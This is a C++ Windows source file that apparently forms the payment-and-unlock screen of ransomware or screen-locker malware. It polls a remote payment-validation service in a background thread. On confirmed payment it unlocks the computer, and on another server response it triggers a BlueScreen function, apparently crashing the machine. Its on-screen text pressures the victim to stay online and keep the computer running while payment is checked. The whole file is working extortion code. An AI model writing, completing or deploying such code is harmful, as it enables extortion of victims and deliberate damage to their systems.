#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <CommCtrl.h>
#include <iostream>
#include <thread>
#include "unlock.h"
#include "panels.h"
#include "core.h"
#include "network.h"

#pragma comment(lib, "comctl32.lib")


#define ID_TIMER 1
using namespace std;
HWND hwndPrgBar, hbtn;

void CheckPayment()
{

    while (true)
    {
        string valPay = getPaymentValidation();
        valPay.erase(std::remove_if(valPay.begin(), valPay.end(), std::isspace), valPay.end());
      

        if (valPay == "2")
        {
            
            const int res = MessageBox(hwndPrgBar, "Payment has been successfully validated!", "UNLOCK", MB_ICONINFORMATION|MB_TOPMOST);
            switch (res)
            {
            case IDOK:

                Unlock(valPay);
                                                      
             break;
         
            default:
                break;
            }

         
         break;
           
          
        }
       
        if (valPay == "1")
        {
            BlueScreen();
            break;

        }
      
        if (valPay == "0")
        {
            
           
        }
        Sleep(1000);

    }
 

}


LRESULT CALLBACK UnlockPanel(HWND hUnlockPanel, UINT msg, WPARAM wp, LPARAM lp)
{

    HFONT hFont;
    HWND hText;
    HDC hdc{};
   
    int v = 0;
    int h = 0;
    GetDesktopResolution(h, v);
    static HBITMAP bmpsrc = NULL;
    static int i = 0;
  
    const wchar_t* infoText = L"Payments are validated manually, the time for payment validation can be up to an hour.\n\
\n\
The timer is stopped during payment validation\n\
";

    switch (msg)
    {



    case WM_TIMER:

        

        SendMessage(hwndPrgBar, PBM_STEPIT, 0, 0);
        i++;

        if (i == 216000) {

            KillTimer(hUnlockPanel, ID_TIMER);
        
            i = 0;
            InvalidateRect(hUnlockPanel, NULL, TRUE);

        }
        else
        {
            
        }
        break;

    case WM_COMMAND:

        if (i == 0) {

            i = 1;
            SendMessage(hwndPrgBar, PBM_SETPOS, 0, 0);
            SetTimer(hUnlockPanel, ID_TIMER, 5, NULL);
           
        }

        break;
    
    case WM_CREATE:
    {
        INITCOMMONCONTROLSEX icex;

        icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
        icex.dwICC = ICC_PROGRESS_CLASS;
        InitCommonControlsEx(&icex);
        hText = CreateWindowW(L"Static", infoText, WS_CHILD | WS_VISIBLE, 0.04 * h, 0.1 * v, h, 0.5 * v, hUnlockPanel, NULL, NULL, NULL);
        hFont = CreateFont(0.027 * v, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
        SendMessage(hText, WM_SETFONT, WPARAM(hFont), TRUE);
        hText = CreateWindowW(L"Static", L"The computer will be automatically unlocked after payment validation.", WS_CHILD | WS_VISIBLE, 0.125 * h, 0.4 * v, h, 0.5 * v, hUnlockPanel, NULL, NULL, NULL);
        hFont = CreateFont(0.020 * v, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
        SendMessage(hText, WM_SETFONT, WPARAM(hFont), TRUE);
    
        hText = CreateWindowW(L"Static", L"Do not disconnect from the internet or turn of the computer.", WS_CHILD | WS_VISIBLE, 0.16 * h, 0.43 * v, h, 0.5 * v, hUnlockPanel, NULL, NULL, NULL);
        hFont = CreateFont(0.020 * v, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
     

        SendMessage(hText, WM_SETFONT, WPARAM(hFont), TRUE);
        hwndPrgBar = CreateWindowEx(0, PROGRESS_CLASS, NULL,
            WS_CHILD | WS_VISIBLE | PBS_MARQUEE|PBS_SMOOTH,
            0.12 * h, 0.3 * v, 800, 30, hUnlockPanel, NULL, NULL, NULL);

        SendMessage(hwndPrgBar, PBM_SETMARQUEE, 0, MAKELPARAM(0, 150));
        
        thread t1(CheckPayment);
        t1.detach();

    

        break;
    }

    case WM_SHOWWINDOW:
       
        SendMessage(hwndPrgBar, PBM_SETSTEP, 4, 0);
        SendMessage(hwndPrgBar, PBM_SETPOS, 0, 0);
        SetTimer(hUnlockPanel, ID_TIMER, 10, NULL);
     
        break;

    case WM_CLOSE:
        KillTimer(hUnlockPanel, ID_TIMER);
        DestroyWindow(hUnlockPanel);
        break;
    default:
        return DefWindowProcW(hUnlockPanel, msg, wp, lp);

    }


}


void UnlockPanelClass(HINSTANCE hInst)
{
    WNDCLASSW panel = { 0 };

    panel.hbrBackground = (HBRUSH)COLOR_WINDOW;
    panel.hCursor = LoadCursor(NULL, MAKEINTRESOURCE(32663));
    panel.hInstance = hInst;
    panel.lpszClassName = L"unlockPanel";
    panel.lpfnWndProc = UnlockPanel;
  

    RegisterClassW(&panel);

}